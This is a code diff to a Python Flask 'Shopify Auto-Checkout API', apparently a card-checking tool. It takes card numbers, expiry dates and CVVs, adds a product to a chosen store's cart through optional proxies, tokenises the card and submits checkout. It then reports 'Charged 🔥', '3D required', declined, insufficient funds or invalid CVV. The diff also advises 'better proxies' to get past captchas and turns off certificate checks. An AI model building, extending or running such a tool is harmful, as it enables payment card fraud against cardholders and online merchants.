@@ -1,10 +1,11 @@
 from flask import Flask, request, jsonify
-import aiohttp
+import httpx
 import asyncio
 import random
 import re
 from urllib.parse import urlparse
 import json
+import time
 
 app = Flask(__name__)
 
@@ -48,40 +49,41 @@ def parse_proxy(proxy_str):
         # Format: IP:PORT:USERNAME:PASSWORD
         ip, port, username, password = parts
         proxy_url = f"http://{username}:{password}@{ip}:{port}"
-        return proxy_url
+        return {"http://": proxy_url, "https://": proxy_url}
     elif len(parts) == 2:
         # Format: IP:PORT (no auth)
         ip, port = parts
-        return f"http://{ip}:{port}"
+        proxy_url = f"http://{ip}:{port}"
+        return {"http://": proxy_url, "https://": proxy_url}
     else:
         return None
 
 async def fetchProducts(proxy, domain):
     try:
         domain = "https://" + domain
-        proxy_url = parse_proxy(proxy) if proxy else None
+        proxy_config = parse_proxy(proxy) if proxy else None
         
         print(f"🔍 Fetching products from: {domain}")
-        print(f"🔧 Using proxy: {proxy_url}")
+        print(f"🔧 Using proxy: {proxy_config}")
 
-        timeout = aiohttp.ClientTimeout(total=15)
-        connector = aiohttp.TCPConnector(verify_ssl=False)
+        timeout = httpx.Timeout(15.0)
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            async with session.get(f"{domain}/products.json", proxy=proxy_url) as resp:
-                if resp.status != 200:
-                    return False, "Site Error - Failed to fetch products"
-                
-                text = await resp.text()
-                if "shopify" not in text.lower():
-                    return False, "Not a Shopify store"
-                
-                try:
-                    result = (await resp.json())['products']
-                    if not result:
-                        return False, "No products found"
-                except:
-                    return False, "Invalid products data"
+        async with httpx.AsyncClient(proxies=proxy_config, timeout=timeout, verify=False) as client:
+            resp = await client.get(f"{domain}/products.json")
+            
+            if resp.status_code != 200:
+                return False, f"Site Error - Failed to fetch products (HTTP {resp.status_code})"
+            
+            text = resp.text
+            if "shopify" not in text.lower():
+                return False, "Not a Shopify store"
+            
+            try:
+                result = resp.json()['products']
+                if not result:
+                    return False, "No products found"
+            except:
+                return False, "Invalid products data"
 
         min_price = float('inf')
         min_product = None
@@ -116,9 +118,9 @@ async def fetchProducts(proxy, domain):
         else:
             return False, "No available products found"
 
-    except asyncio.TimeoutError:
+    except httpx.TimeoutException:
         return False, "Request timeout"
-    except aiohttp.ClientError as e:
+    except httpx.RequestError as e:
         return False, f"Network error: {str(e)}"
     except Exception as e:
         return False, f"Error fetching products: {str(e)}"
@@ -132,9 +134,9 @@ async def process_card(cc, mes, ano, cvv, site=None, proxy=None):
             'Content-Type': 'application/json'
         }
 
-        proxy_str = parse_proxy(proxy)
+        proxy_config = parse_proxy(proxy)
         print(f"🎯 Processing card for site: {site}")
-        print(f"🔧 Proxy: {proxy_str}")
+        print(f"🔧 Proxy: {proxy_config}")
 
         ourl = 'https://' + str(site)
         
@@ -164,33 +166,32 @@ async def process_card(cc, mes, ano, cvv, site=None, proxy=None):
 
         print(f"✅ Found product variant: {variant_id}")
 
-        timeout = aiohttp.ClientTimeout(total=30)
-        connector = aiohttp.TCPConnector(verify_ssl=False)
+        timeout = httpx.Timeout(30.0)
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
+        async with httpx.AsyncClient(proxies=proxy_config, timeout=timeout, headers=headers, verify=False) as client:
             
             # Add to cart
             cart_url = f"{ourl}/cart/add.js"
             cart_data = {'id': variant_id, 'quantity': 1}
             
             try:
-                async with session.post(cart_url, data=cart_data, proxy=proxy_str) as resp:
-                    if resp.status != 200:
-                        return False, "Failed to add to cart"
-                    print("🛒 Added to cart successfully")
+                resp = await client.post(cart_url, json=cart_data)
+                if resp.status_code != 200:
+                    return False, f"Failed to add to cart (HTTP {resp.status_code})"
+                print("🛒 Added to cart successfully")
             except Exception as e:
                 return False, f"Cart error: {str(e)}"
 
             # Go to checkout
             checkout_url = f"{ourl}/checkout"
             try:
-                async with session.get(checkout_url, proxy=proxy_str, allow_redirects=True) as resp:
-                    checkout_url_str = str(resp.url)
-                    if 'login' in checkout_url_str.lower():
-                        return False, "Site requires login!"
-                    
-                    text = await resp.text()
-                    print("✅ Accessed checkout page")
+                resp = await client.get(checkout_url, follow_redirects=True)
+                checkout_url_str = str(resp.url)
+                if 'login' in checkout_url_str.lower():
+                    return False, "Site requires login!"
+                
+                text = resp.text
+                print("✅ Accessed checkout page")
             except Exception as e:
                 return False, f"Checkout access error: {str(e)}"
 
@@ -226,19 +227,18 @@ async def process_card(cc, mes, ano, cvv, site=None, proxy=None):
             }
 
             try:
-                async with session.post(
+                resp = await client.post(
                     'https://deposit.shopifycs.com/sessions', 
-                    json=payment_payload, 
-                    proxy=proxy_str
-                ) as resp:
-                    if resp.status == 200:
-                        token_data = await resp.json()
-                        payment_token = token_data.get('id')
-                        if not payment_token:
-                            return False, "Failed to get payment token"
-                        print("✅ Got payment token")
-                    else:
-                        return False, f"Payment token failed: HTTP {resp.status}"
+                    json=payment_payload
+                )
+                if resp.status_code == 200:
+                    token_data = resp.json()
+                    payment_token = token_data.get('id')
+                    if not payment_token:
+                        return False, "Failed to get payment token"
+                    print("✅ Got payment token")
+                else:
+                    return False, f"Payment token failed: HTTP {resp.status_code}"
             except Exception as e:
                 return False, f"Payment token error: {str(e)}"
 
@@ -283,42 +283,60 @@ async def process_card(cc, mes, ano, cvv, site=None, proxy=None):
             }
 
             try:
-                async with session.post(graphql_url, json=submit_data, proxy=proxy_str) as resp:
-                    response_text = await resp.text()
-                    print(f"📄 Final response: {response_text[:500]}...")
-                    
-                    # Check for common errors
-                    if "Your order total has changed." in response_text:
-                        return False, "Site not supported - order total changed"
-                    if "CAPTCHA" in response_text:
-                        return False, "Captcha detected - use better proxies"
-                    if "PAYMENTS_CREDIT_CARD" in response_text:
-                        return False, "Card declined or invalid"
-                    if "The requested payment method is not available." in response_text:
-                        return False, "Shopify Payments not available"
-                    
-                    # Check for success
-                    try:
-                        result = json.loads(response_text)
-                        if 'data' in result and 'submitForCompletion' in result['data']:
-                            if 'receipt' in result['data']['submitForCompletion']:
-                                return True, f"✅ Charged ${subtotal} {currency}!", "Shopify", subtotal, currency
-                            elif 'reason' in result['data']['submitForCompletion']:
-                                return False, f"Payment failed: {result['data']['submitForCompletion']['reason']}"
-                    except:
-                        pass
-                    
-                    if 'receipt' in response_text.lower():
-                        return True, f"✅ Charged ${subtotal} {currency}!", "Shopify", subtotal, currency
-                    
-                    return False, "Payment processing failed - unknown response"
+                resp = await client.post(graphql_url, json=submit_data)
+                response_text = resp.text
+                print(f"📄 Final response: {response_text[:500]}...")
+                
+                # Check for specific response patterns
+                if "3d_secure" in response_text.lower() or "three_d_secure" in response_text.lower() or "actionreq" in response_text.lower():
+                    return "3d_required", "3d required 🔒", "Shopify", subtotal, currency
+                
+                if "card declined" in response_text.lower() or "declined" in response_text.lower():
+                    return False, "card declined", "Shopify", subtotal, currency
+                
+                # Check for common errors
+                if "Your order total has changed." in response_text:
+                    return False, "Site not supported - order total changed"
+                if "CAPTCHA" in response_text or "CAPTCHA_METADATA_MISSING" in response_text:
+                    return False, "Captcha detected - use better proxies"
+                if "PAYMENTS_CREDIT_CARD" in response_text:
+                    return False, "card declined"
+                if "The requested payment method is not available." in response_text:
+                    return False, "Shopify Payments not available"
+                if "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE" in response_text:
+                    return False, "Invalid CVV"
+                if "insufficient" in response_text.lower() or "insuff" in response_text.lower():
+                    return False, "Insufficient funds"
+                if "invalid_cvc" in response_text.lower() or "incorrect_cvc" in response_text.lower():
+                    return False, "Invalid CVC"
+                if "ZIP" in response_text:
+                    return False, "Incorrect ZIP code"
+                
+                # Check for success
+                try:
+                    result = json.loads(response_text)
+                    if 'data' in result and 'submitForCompletion' in result['data']:
+                        if 'receipt' in result['data']['submitForCompletion']:
+                            return True, "Charged 🔥", "Shopify", subtotal, currency
+                        elif 'reason' in result['data']['submitForCompletion']:
+                            reason = result['data']['submitForCompletion']['reason']
+                            if "declined" in reason.lower():
+                                return False, "card declined", "Shopify", subtotal, currency
+                            return False, f"Payment failed: {reason}"
+                except:
+                    pass
+                
+                if 'receipt' in response_text.lower():
+                    return True, "Charged 🔥", "Shopify", subtotal, currency
+                
+                return False, "Payment processing failed - unknown response"
 
             except Exception as e:
                 return False, f"Final submission error: {str(e)}"
 
-    except asyncio.TimeoutError:
+    except httpx.TimeoutException:
         return False, "Request timeout - site may be slow or proxy not working"
-    except aiohttp.ClientError as e:
+    except httpx.RequestError as e:
         return False, f"Network error: {str(e)}"
     except Exception as e:
         return False, f"Unexpected error: {str(e)}"
@@ -382,48 +400,123 @@ def autosh_endpoint():
                 'message': 'Invalid credit card number'
             }), 400
         
-        if not month.isdigit() or not year.isdigit() or not cvv.isdigit():
+        if not month.isdigit() or not (1 <= int(month) <= 12):
             return jsonify({
                 'status': 'error',
-                'message': 'Invalid card details'
+                'message': 'Invalid month (1-12)'
+            }), 400
+            
+        if not year.isdigit() or len(year) != 4:
+            return jsonify({
+                'status': 'error',
+                'message': 'Invalid year (4 digits)'
+            }), 400
+            
+        if not cvv.isdigit() or len(cvv) not in [3, 4]:
+            return jsonify({
+                'status': 'error',
+                'message': 'Invalid CVV (3-4 digits)'
             }), 400
         
         # Process the request
         print(f"🚀 Starting process for site: {site}")
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        result = loop.run_until_complete(
-            process_card(cc_number, month, year, cvv, site, proxy if proxy else None)
-        )
-        loop.close()
+        start_time = time.time()
         
-        # Format response
-        if result[0]:  # Success
+        # Create new event loop for async processing
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            result = loop.run_until_complete(
+                process_card(cc_number, month, year, cvv, site, proxy if proxy else None)
+            )
+        finally:
+            loop.close()
+        
+        processing_time = time.time() - start_time
+        
+        # Format response according to specifications
+        base_response = {
+            'gateway': 'Shopify',
+            'site': site,
+            'processing_time': f"{processing_time:.2f}s"
+        }
+        
+        if result and result[0] == "3d_required":
+            # 3D Secure required
             response_data = {
                 'status': 'success',
-                'message': result[1],
-                'gateway': result[2] if len(result) > 2 else 'Shopify',
-                'site': site
+                'message': '3d required 🔒',
+                **base_response
             }
-            
             if len(result) > 3:
                 response_data['amount'] = result[3]
             if len(result) > 4:
                 response_data['currency'] = result[4]
-                
+            print(f"🔒 3D Secure Required")
             return jsonify(response_data)
-        else:  # Failed
-            return jsonify({
-                'status': 'failed',
-                'message': result[1],
-                'site': site
-            })
+            
+        elif result and result[0] is True:
+            # Successfully charged
+            response_data = {
+                'status': 'success',
+                'message': 'Charged 🔥',
+                **base_response
+            }
+            if len(result) > 3:
+                response_data['amount'] = result[3]
+            if len(result) > 4:
+                response_data['currency'] = result[4]
+            print(f"✅ Charged Successfully")
+            return jsonify(response_data)
+            
+        else:
+            # Failed or declined
+            error_msg = result[1] if result else "Unknown error occurred"
+            
+            # Check if it's specifically a card decline
+            if "card declined" in error_msg.lower():
+                response_data = {
+                    'status': 'failed',
+                    'message': 'card declined',
+                    **base_response
+                }
+                if result and len(result) > 3:
+                    response_data['amount'] = result[3]
+                if result and len(result) > 4:
+                    response_data['currency'] = result[4]
+                print(f"❌ Card Declined")
+                return jsonify(response_data)
+            else:
+                # Other failure
+                response_data = {
+                    'status': 'failed',
+                    'message': error_msg,
+                    **base_response
+                }
+                print(f"❌ Failed: {error_msg}")
+                return jsonify(response_data)
             
     except Exception as e:
+        print(f"💥 Server error: {str(e)}")
         return jsonify({
             'status': 'error',
             'message': f'Internal server error: {str(e)}'
         }), 500
 
+@app.route('/test', methods=['GET'])
+def test_endpoint():
+    """Test endpoint to verify the API is working"""
+    return jsonify({
+        'status': 'success',
+        'message': 'API is running correctly',
+        'timestamp': time.time()
+    })
+
 if __name__ == '__main__':
+    print("🚀 Starting Shopify Auto-Checkout API...")
+    print("📝 Available endpoints:")
+    print("   GET / - API documentation")
+    print("   GET /health - Health check")
+    print("   GET /autosh - Main checkout endpoint")
+    print("   GET /test - Test endpoint")
     app.run(host='0.0.0.0', port=5000, debug=False)
